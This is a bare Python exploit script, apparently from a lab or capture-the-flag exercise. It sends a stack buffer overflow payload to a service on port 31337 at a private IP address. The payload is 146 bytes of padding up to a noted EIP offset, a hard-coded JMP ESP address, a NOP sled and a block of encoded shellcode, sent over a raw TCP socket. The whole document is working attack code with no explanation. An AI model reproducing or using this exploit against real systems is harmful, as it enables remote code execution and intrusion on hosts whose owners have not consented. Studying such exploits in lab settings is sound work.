```
#!/usr/bin/python

import socket
import struct

ip = '192.168.56.102'
port = 31337

# EIP offset = 146

buf =  ""
buf += "\xda\xca\xba\xbf\x4c\xda\x1b\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\xef\x5f\x38"
buf += "\xee\xf3\x88\x3e\x11\x0b\x49\x5f\x9b\xee\x78\x5f\xff"
buf += "\x7b\x2a\x6f\x8b\x29\xc7\x04\xd9\xd9\x5c\x68\xf6\xee"
buf += "\xd5\xc7\x20\xc1\xe6\x74\x10\x40\x65\x87\x45\xa2\x54"
buf += "\x48\x98\xa3\x91\xb5\x51\xf1\x4a\xb1\xc4\xe5\xff\x8f"
buf += "\xd4\x8e\x4c\x01\x5d\x73\x04\x20\x4c\x22\x1e\x7b\x4e"
buf += "\xc5\xf3\xf7\xc7\xdd\x10\x3d\x91\x56\xe2\xc9\x20\xbe"
buf += "\x3a\x31\x8e\xff\xf2\xc0\xce\x38\x34\x3b\xa5\x30\x46"
buf += "\xc6\xbe\x87\x34\x1c\x4a\x13\x9e\xd7\xec\xff\x1e\x3b"
buf += "\x6a\x74\x2c\xf0\xf8\xd2\x31\x07\x2c\x69\x4d\x8c\xd3"
buf += "\xbd\xc7\xd6\xf7\x19\x83\x8d\x96\x38\x69\x63\xa6\x5a"
buf += "\xd2\xdc\x02\x11\xff\x09\x3f\x78\x68\xfd\x72\x82\x68"
buf += "\x69\x04\xf1\x5a\x36\xbe\x9d\xd6\xbf\x18\x5a\x18\xea"
buf += "\xdd\xf4\xe7\x15\x1e\xdd\x23\x41\x4e\x75\x85\xea\x05"
buf += "\x85\x2a\x3f\x89\xd5\x84\x90\x6a\x85\x64\x41\x03\xcf"
buf += "\x6a\xbe\x33\xf0\xa0\xd7\xde\x0b\x23\x18\xb6\x2b\xd6"
buf += "\xf0\xc5\x4b\x3f\x06\x43\xad\x55\x18\x05\x66\xc2\x81"
buf += "\x0c\xfc\x73\x4d\x9b\x79\xb3\xc5\x28\x7e\x7a\x2e\x44"
buf += "\x6c\xeb\xde\x13\xce\xba\xe1\x89\x66\x20\x73\x56\x76"
buf += "\x2f\x68\xc1\x21\x78\x5e\x18\xa7\x94\xf9\xb2\xd5\x64"
buf += "\x9f\xfd\x5d\xb3\x5c\x03\x5c\x36\xd8\x27\x4e\x8e\xe1"
buf += "\x63\x3a\x5e\xb4\x3d\x94\x18\x6e\x8c\x4e\xf3\xdd\x46"
buf += "\x06\x82\x2d\x59\x50\x8b\x7b\x2f\xbc\x3a\xd2\x76\xc3"
buf += "\xf3\xb2\x7e\xbc\xe9\x22\x80\x17\xaa\x53\xcb\x35\x9b"
buf += "\xfb\x92\xac\x99\x61\x25\x1b\xdd\x9f\xa6\xa9\x9e\x5b"
buf += "\xb6\xd8\x9b\x20\x70\x31\xd6\x39\x15\x35\x45\x39\x3c"

load = ''
load += "A" * 146 # EIP offset = 146
load += struct.pack("I", 0x080416BF) # JMP ESP
load += "\x90" * 16
load += buf # shellcode
load += "\x90" * (1024 - len(load))
load += "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send((load))
s.close()

```
